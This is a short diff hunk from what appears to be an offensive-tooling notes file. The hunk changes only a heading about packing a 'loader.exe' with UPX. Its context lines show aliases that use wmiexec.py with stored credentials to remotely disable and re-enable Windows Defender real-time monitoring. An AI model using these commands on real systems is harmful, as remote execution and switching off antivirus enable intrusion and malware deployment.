@@ -410,7 +410,7 @@ alias avup="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -
 alias avdown="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -DisableRealtimeMonitoring \$true'"
 ```
 
-## reduced size and PACK with UPX
+## reduced size and PACK with UPX
 
 ```
 sudo upx -9 -v --ultra-brute  target/x86_64-pc-windows-gnu/release/loader.exe
